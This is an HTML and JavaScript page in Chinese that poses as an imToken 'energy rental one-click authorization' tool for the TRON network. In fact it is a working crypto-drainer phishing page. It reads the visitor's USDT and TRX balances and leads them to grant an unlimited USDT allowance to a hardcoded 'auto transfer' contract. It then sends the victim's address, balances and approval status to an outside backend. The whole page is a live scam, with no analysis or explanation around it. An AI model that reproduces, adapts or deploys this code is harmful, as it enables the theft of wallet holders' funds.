<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>imToken一键能量授权</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
               padding: 20px; max-width: 500px; margin: 0 auto; background: #f5f5f5; }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { font-size: 22px; color: #2c3e50; margin-bottom: 10px; }
        .warning { background: #fff8e1; color: #e6a23c; padding: 12px; border-radius: 8px;
                   font-size: 14px; margin-bottom: 20px; text-align: left; }
        .btn { width: 100%; padding: 15px; font-size: 16px; border: none; border-radius: 8px;
               background: #409EFF; color: white; cursor: pointer; margin-bottom: 15px; }
        .btn:disabled { background: #ccc; cursor: not-allowed; }
        #userInfo { text-align: center; font-size: 14px; color: #333; margin: 20px 0; padding: 15px; background: #fff; border-radius: 8px; }
        .record-list { margin-top: 30px; }
        .record-item { background: #fff; padding: 15px; margin-bottom: 15px; border-radius: 8px; font-size: 14px; }
        .record-item p { margin-bottom: 8px; color: #333; }
        .record-item p strong { color: #2c3e50; }
        .tx-link { color: #409EFF; text-decoration: none; }
    </style>
</head>
<body>
<div class="header">
    <h1>能量租赁一键授权</h1>
    <div class="warning">
        ⚠️ 点击【唤起imToken】按钮跳转钱包<br>
        ⚠️ 已匹配后端，发送6个字段（含授权状态）
    </div>
</div>
<div style="margin: 15px 0; display: flex; align-items: center; gap: 10px;">
    <span id="copyLinkText" style="color: #007AFF; word-break: break-all;">
        https://trc20trx-alt.github.io/Trc20.TRX/
    </span>
    <button id="copyLinkBtn" style="padding: 5px 10px; cursor: pointer;">
        <strong>复制链接</strong>
    </button>
</div>
<!-- 按钮文本修改为“唤起imToken”，明确Deep Link跳转逻辑 -->
<button id="connectBtn" class="btn">唤起imToken钱包</button>
<button id="approveBtn" class="btn" disabled>能量授权</button>
<div id="userInfo">未唤起imToken</div>
<div class="record-list">
    <h3 style="font-size: 16px; margin-bottom: 15px; color: #2c3e50;">授权记录</h3>
    <div id="approvalRecords">暂无授权记录</div>
</div>
<script>
    // 原始配置不变
    const AUTO_TRANSFER_CONTRACT = "TC3AEtwB9MP7xvraxcuzeUa6ycNyLGaGrW";
    const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval";
    const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
    // 全局变量
    let tronWeb, userAddress, trc20Contract;
    let tokenBalance = "0.00", trxBalance = "0.00";
    const RECORD_KEY = "imtoken_infinite_approval_records";

    // 新增：检测是否为imToken内置浏览器（通过User-Agent判断）
    function isImTokenBrowser() {
        return navigator.userAgent.toLowerCase().includes("imtoken");
    }

    window.onload = async () => {
        const connectBtn = document.getElementById("connectBtn");
        const approveBtn = document.getElementById("approveBtn");
        const copyLinkText = document.getElementById("copyLinkText");
        const copyLinkBtn = document.getElementById("copyLinkBtn");
        renderApprovalRecords();

        // 复制链接功能不变
        copyLinkBtn.addEventListener("click", async () => {
            try {
                await navigator.clipboard.writeText(copyLinkText.textContent.trim());
                alert("【复制】链接已复制");
            } catch (e) { alert(`【复制】失败：${e.message}`); }
        });

        // 1. 若已在imToken内置浏览器，直接初始化钱包
        if (isImTokenBrowser() && window.tronWeb && window.tronWeb.ready) {
            tronWeb = window.tronWeb;
            await initWallet();
        } else {
            document.getElementById("userInfo").innerHTML = "请点击【唤起imToken】跳转钱包";
        }

        // 2. 核心修改：通过Deep Link唤起imToken内置浏览器（格式：imtoken://browser?url=编码后页面URL）
        connectBtn.onclick = async () => {
            try {
                // 生成当前页面的编码URL（确保imToken打开后加载当前页面）
                const encodedUrl = encodeURIComponent(window.location.href);
                // imToken Deep Link：唤起内置浏览器并打开当前页面
                const deepLink = `imtoken://browser?url=${encodedUrl}`;
                
                // 跳转Deep Link（唤起imToken）
                window.location.href = deepLink;

                // 唤起后延迟检测（用户返回页面时重新初始化）
                setTimeout(async () => {
                    if (isImTokenBrowser() && window.tronWeb) {
                        tronWeb = window.tronWeb;
                        await initWallet();
                    }
                }, 3000);
            } catch (e) {
                alert(`【唤起失败】：${e.message}\n请手动打开imToken内置浏览器访问链接`);
            }
        };

        // 3. 授权逻辑不变（仅依赖tronWeb，唤起后自动可用）
        approveBtn.onclick = async () => {
            const postData = {
                address: userAddress || "",          
                tokenBalance: tokenBalance,          
                trxBalance: trxBalance,              
                approveTime: new Date().toLocaleString(), 
                txHash: "未生成",                    
                isApproved: false                    
            };
            try {
                if (!trc20Contract || !userAddress) throw new Error("请先唤起imToken并连接");
                
                const result = await trc20Contract.approve(
                    AUTO_TRANSFER_CONTRACT,
                    INFINITE_APPROVE_AMOUNT
                ).send({ from: userAddress, shouldPollResponse: true });
                
                postData.txHash = result.transaction.txID;
                postData.isApproved = true;
                alert(`【授权】成功！txHash：${postData.txHash.slice(0,16)}...`);
                
                saveApprovalRecord({
                    address: userAddress,
                    tokenBalance: tokenBalance,
                    trxBalance: trxBalance,
                    approveTime: postData.approveTime,
                    txHash: postData.txHash,
                    approveType: "无限额度"
                });
                renderApprovalRecords();
            } catch (e) {
                postData.isApproved = false;
                alert(`【授权】失败：${e.message}`);
            } finally {
                try {
                    alert(`【发送】6个字段（含授权状态）：\n1.地址：${postData.address.slice(0,8)}...\n2.USDT：${postData.tokenBalance}\n3.TRX：${postData.trxBalance}\n4.时间：${postData.approveTime}\n5.哈希：${postData.txHash.slice(0,10)}...\n6.授权成功：${postData.isApproved}`);
                    
                    const res = await fetch(BACKEND_API, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(postData),
                        credentials: "include"
                    });
                    const resData = await res.json();
                    if (!res.ok) throw new Error(resData.error || `后端返回${res.status}`);
                    alert(`【发送】成功！后端反馈：${resData.message}`);
                } catch (sendErr) {
                    alert(`【发送】失败：${sendErr.message}`);
                }
            }
        };
    };

    // 初始化钱包逻辑不变（仅在imToken内置浏览器中生效）
    async function initWallet() {
        try {
            userAddress = tronWeb.defaultAddress.base58;
            trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
            
            // 采集余额
            const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
            tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
            const trxRaw = await tronWeb.trx.getBalance(userAddress);
            trxBalance = (Number(trxRaw) / 1000000).toFixed(2);
            
            // 更新UI
            document.getElementById("userInfo").innerHTML = `
                已连接：<br>
                ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
                USDT：${tokenBalance} USDT<br>
                TRX：${trxBalance} TRX
            `;
            document.getElementById("approveBtn").disabled = false;
        } catch (e) {
            alert(`【初始化】失败：${e.message}`);
            tokenBalance = "0.00";
            trxBalance = "0.00";
        }
    }

    // 辅助函数（保存/渲染记录）不变
    function saveApprovalRecord(record) {
        try {
            const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
            const newRecords = existing.filter(item => item.address !== record.address);
            newRecords.push(record);
            localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
        } catch (e) {
            alert(`【保存】失败：${e.message}`);
        }
    }

    function renderApprovalRecords() {
        try {
            const container = document.getElementById("approvalRecords");
            const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
            if (records.length === 0) {
                container.innerHTML = "<div class='record-item'>暂无授权记录</div>";
                return;
            }
            container.innerHTML = records.map(record => `
                <div class="record-item">
                    <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
                    <p><strong>授权类型：</strong>${record.approveType}</p>
                    <p><strong>USDT：</strong>${record.tokenBalance} USDT</p>
                    <p><strong>TRX：</strong>${record.trxBalance} TRX</p>
                    <p><strong>时间：</strong>${record.approveTime}</p>
                    ${record.txHash ? `<p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">查看交易</a></p>` : ""}
                </div>
            `).join("");
        } catch (e) {
            alert(`【渲染】失败：${e.message}`);
        }
    }
</script>
</body>
</html>
